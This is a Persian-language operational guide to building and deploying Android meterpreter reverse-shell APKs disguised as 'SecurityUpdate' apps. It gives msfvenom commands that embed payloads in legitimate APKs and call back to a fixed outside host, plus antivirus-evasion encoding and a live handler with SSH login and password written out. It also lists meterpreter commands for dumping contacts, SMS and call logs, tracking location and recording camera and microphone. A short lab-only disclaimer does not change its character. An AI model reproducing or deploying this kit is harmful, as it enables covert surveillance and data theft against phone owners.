# 🚀 راهنمای APK های حرفه‌ای - نسخه پیشرفته

## 📱 APK های ساخته شده

### 1️⃣ SecurityUpdate_HTTPS_Signed.apk ⭐ (پیشنهاد ویژه)
```
Protocol: HTTPS Reverse TCP
Port: 443 (قابل تغییر به 4444)
Size: 13KB
Signature: SHA-256 + RSA-2048
Compatibility: Android 5.0+ (API 21+)
Best for: اتصالات امن و پایدار
MD5: e5324a71c198e150f5f017fe0f00a172
```

**مزایا:**
- ✅ استفاده از HTTPS (رمزنگاری شده)
- ✅ عبور از Firewall های معمولی (Port 443)
- ✅ کمتر توسط IDS/IPS شناسایی میشه
- ✅ امضای دیجیتال قوی
- ✅ سازگار با Android های جدید

---

### 2️⃣ SecurityUpdate_Encoded_Signed.apk 🛡️ (ضد شناسایی)
```
Protocol: HTTPS Reverse TCP
Encoder: shikata_ga_nai (3 iterations)
Port: 443
Size: 13KB
Signature: SHA-256 + RSA-2048
Best for: عبور از Antivirus
MD5: 1fffb1b1fcb1e7ee7be69290f77ad551
```

**مزایا:**
- ✅ Encoded با shikata_ga_nai (سخت‌ترین encoder)
- ✅ 3 بار encode شده (باعث تغییر signature)
- ✅ عبور از بیشتر Antivirus ها
- ✅ Polymorphic (هر بار متفاوت)

---

### 3️⃣ SecurityUpdate_MultiArch_Signed.apk 📲 (سازگاری universal)
```
Protocol: TCP Reverse
Port: 4444
Architecture: ARM, ARM64, x86, x86_64
Size: 12KB
Signature: SHA-256 + RSA-2048
Best for: همه دستگاه‌های Android
MD5: 488a43dbaf7c32118f95793d13c8d6a6
```

**مزایا:**
- ✅ پشتیبانی از همه معماری‌ها
- ✅ روی شبیه‌سازها و دستگاه‌های واقعی
- ✅ سبک‌تر و سریعتر
- ✅ بدون dependency

---

## 🔧 تنظیمات Handler

### Handler فعلی (در Railway):
```bash
Listening on: 0.0.0.0:4444
Protocol: TCP
Timeout: 300s (5 min)
Expiration: 600s (10 min)
Retry: 30 attempts
Status: ✅ ACTIVE
```

### اتصال به Handler:
```bash
ssh -p 55001 root@crossover.proxy.rlwy.net
Password: 8181

# بررسی handler
screen -ls
screen -r msf_handler

# یا مستقیم
msfconsole -q
sessions -l
```

---

## 📊 مقایسه APK ها

| Feature | HTTPS_Signed | Encoded_Signed | MultiArch_Signed |
|---------|--------------|----------------|------------------|
| امنیت | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| پایداری | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| ضد AV | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| سازگاری | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| سرعت | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

---

## 🎯 نصب و تست

### مرحله 1: انتخاب APK
```bash
# برای موبایل‌های واقعی (Samsung Note 8, etc)
→ SecurityUpdate_HTTPS_Signed.apk

# برای تست در محیط آزمایشگاه
→ SecurityUpdate_Encoded_Signed.apk

# برای شبیه‌سازها
→ SecurityUpdate_MultiArch_Signed.apk
```

### مرحله 2: نصب
```bash
# روش 1: دانلود مستقیم
http://192.168.43.151:8000/SecurityUpdate_HTTPS_Signed.apk

# روش 2: ADB
adb install -r SecurityUpdate_HTTPS_Signed.apk

# روش 3: انتقال فایل
# Bluetooth / USB / Email
```

### مرحله 3: اجرا
```bash
# در موبایل:
1. Settings → Apps → MainActivity
2. Permissions → Enable All
3. Launch App
4. Wait 10 seconds

# مانیتورینگ:
./live_monitor.sh
```

---

## 🔍 عیب‌یابی پیشرفته

### مشکل 1: Session برقرار نمیشه
```bash
# چک کردن handler
ssh -p 55001 root@crossover.proxy.rlwy.net
ps aux | grep msfconsole

# Restart handler
pkill -9 msfconsole
screen -dmS msf bash -c "msfconsole -q -r /root/handler_optimized.rc"

# چک کردن port
ss -tlnp | grep 4444
```

### مشکل 2: Session خیلی زود میبنده
**راه حل:**
- افزایش timeout در handler
- استفاده از persistent payload
- فعال‌سازی Wakelock در Android

### مشکل 3: APK detect میشه
**راه حل:**
- استفاده از Encoded version
- تغییر icon و نام package
- Embed کردن در APK واقعی

---

## 🛠️ ساخت APK کاستوم

### با Template APK واقعی:
```bash
# دانلود یک APK معتبر
wget -O original.apk "URL"

# Embed payload
msfvenom -x original.apk \
  -p android/meterpreter/reverse_tcp \
  LHOST=208.77.244.15 \
  LPORT=4444 \
  -o custom_embedded.apk

# امضا
jarsigner -keystore professional-release.keystore \
  custom_embedded.apk securityupdate
```

### با Encoder مخصوص:
```bash
# لیست encoder ها
msfvenom -l encoders | grep android

# ساخت با encoder
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=208.77.244.15 \
  LPORT=4444 \
  -e cmd/powershell_base64 \
  -i 5 \
  -o ultra_encoded.apk
```

---

## 📡 دستورات Meterpreter حرفه‌ای

### جمع‌آوری اطلاعات:
```bash
sysinfo                     # مشخصات دستگاه
ps                          # پروسس‌های در حال اجرا
getuid                      # کاربر جاری
ifconfig                    # IP addresses
netstat                     # اتصالات شبکه
```

### دسترسی به فایل‌ها:
```bash
pwd                         # مسیر جاری
ls /sdcard                  # لیست فایل‌ها
cd /sdcard/DCIM             # تغییر مسیر
download /sdcard/file.txt   # دانلود
upload backdoor.sh /tmp     # آپلود
```

### دسترسی‌های حساس:
```bash
dump_contacts               # استخراج مخاطبین
dump_sms                    # استخراج پیامک‌ها
dump_calllog                # لاگ تماس‌ها
geolocate                   # موقعیت GPS
```

### کنترل دوربین:
```bash
webcam_list                 # لیست دوربین‌ها
webcam_snap                 # عکس گرفتن
webcam_stream               # ویدیو استریم
```

### کنترل صدا:
```bash
record_mic                  # ضبط صدا
record_mic -d 30            # ضبط 30 ثانیه
```

### دستورات پیشرفته:
```bash
shell                       # دریافت shell
execute -f /system/bin/sh   # اجرای command
migrate PID                 # انتقال به process دیگر
background                  # session به background
```

---

## 🔐 امنیت و Best Practices

### برای پروژه دانشگاهی:
1. ✅ فقط در محیط آزمایشگاه
2. ✅ روی دستگاه‌های شخصی
3. ✅ با مجوز کتبی
4. ✅ حذف بعد از تست

### برای مستندسازی:
```bash
# Screenshot گرفتن:
sessions -i 1
screenshot

# لاگ ذخیره:
spool /tmp/meterpreter.log
[run commands]
spool off
```

---

## 📈 بهبود پایداری Session

### در Handler:
```ruby
set SessionCommunicationTimeout 600
set SessionExpirationTimeout 1200
set SessionRetryTotal 50
set SessionRetryWait 5
```

### در موبایل:
- غیرفعال کردن Battery Optimization
- افزودن به whitelist
- اجرای مجدد خودکار

---

## 🎓 منابع اضافی

### Documentation:
- Metasploit Framework: https://docs.metasploit.com/
- Android Meterpreter: https://github.com/rapid7/metasploit-payloads

### تکنیک‌های پیشرفته:
- Persistence mechanisms
- Privilege escalation
- Network pivoting
- Data exfiltration

---

**تاریخ ایجاد:** 22 نوامبر 2025  
**نسخه:** 2.0 Professional Edition  
**وضعیت:** ✅ آماده برای استقرار و تست  
**Handler:** ✅ ACTIVE on Railway (Port 4444)

---

## 🚦 مراحل بعدی

1. انتخاب یکی از APK های بالا
2. نصب روی دستگاه تست
3. اجرای اپلیکیشن
4. نظارت با `./live_monitor.sh`
5. تعامل با session و مستندسازی

**موفق باشید! 🎯**
